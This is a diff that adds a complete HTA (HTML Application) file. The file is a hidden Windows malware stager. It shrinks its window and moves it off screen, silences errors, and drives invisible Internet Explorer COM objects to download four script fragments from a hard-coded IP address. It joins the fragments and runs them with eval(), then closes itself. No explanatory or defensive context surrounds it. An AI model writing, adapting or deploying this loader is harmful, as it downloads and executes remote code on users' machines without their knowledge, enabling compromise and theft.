@@ -1,0 +1,79 @@
+<html>
+<head>
+<script language="JScript">
+window.resizeTo(1, 1);
+window.moveTo(-2000, -2000);
+window.blur();
+try
+{
+	window.onfocus = function() { window.blur(); }
+	window.onerror = function(sMsg, sUrl, sLine) { return false; }
+}
+catch (e){}
+</script>
+<script language="JScript">
+try
+{
+var resp = "";
+var data = "";
+var ie_com1 = new ActiveXObject("InternetExplorer.Application");
+					   ie_com1.Silent = true;
+					   ie_com1.Visible = false;
+ie_com1.Navigate2("http://66.42.65.58/B1.html", 14, 0, null, null);
+while(ie_com1.Busy) {
+	var shell = new ActiveXObject("WScript.Shell");
+	shell.Run("ping 127.0.0.1 -n 1", 0, true);
+}
+data = ie_com1.document.body.innerHTML;
+data = data.slice(5,-6);
+resp =  resp + data;
+ie_com1.Quit();
+var ie_com2 = new ActiveXObject("InternetExplorer.Application");
+					   ie_com2.Silent = true;
+					   ie_com2.Visible = false;
+ie_com2.Navigate2("http://66.42.65.58/B2.html", 14, 0, null, null);
+while(ie_com2.Busy) {
+	var shell = new ActiveXObject("WScript.Shell");
+	shell.Run("ping 127.0.0.1 -n 1", 0, true);
+}
+data = ie_com2.document.body.innerHTML;
+data = data.slice(5,-6);
+resp =  resp + data;
+ie_com2.Quit();
+var ie_com3 = new ActiveXObject("InternetExplorer.Application");
+					   ie_com3.Silent = true;
+					   ie_com3.Visible = false;
+ie_com3.Navigate2("http://66.42.65.58/B3.html", 14, 0, null, null);
+while(ie_com3.Busy) {
+	var shell = new ActiveXObject("WScript.Shell");
+	shell.Run("ping 127.0.0.1 -n 1", 0, true);
+}
+data = ie_com3.document.body.innerHTML;
+data = data.slice(5,-6);
+resp =  resp + data;
+ie_com3.Quit();
+var ie_com4 = new ActiveXObject("InternetExplorer.Application");
+					   ie_com4.Silent = true;
+					   ie_com4.Visible = false;
+ie_com4.Navigate2("http://66.42.65.58/B4.html", 14, 0, null, null);
+while(ie_com4.Busy) {
+	var shell = new ActiveXObject("WScript.Shell");
+	shell.Run("ping 127.0.0.1 -n 1", 0, true);
+}
+data = ie_com4.document.body.innerHTML;
+data = data.slice(5,-6);
+resp =  resp + data;
+ie_com4.Quit();
+eval(resp);
+}
+catch(e){}
+window.close();
+self.close();
+</script>
+<hta:application caption="no" showInTaskBar="no" windowState="minimize"
+navigable="no" scroll="no" />
+<!--  -->
+</head>
+<body>
+</body>
+</html>
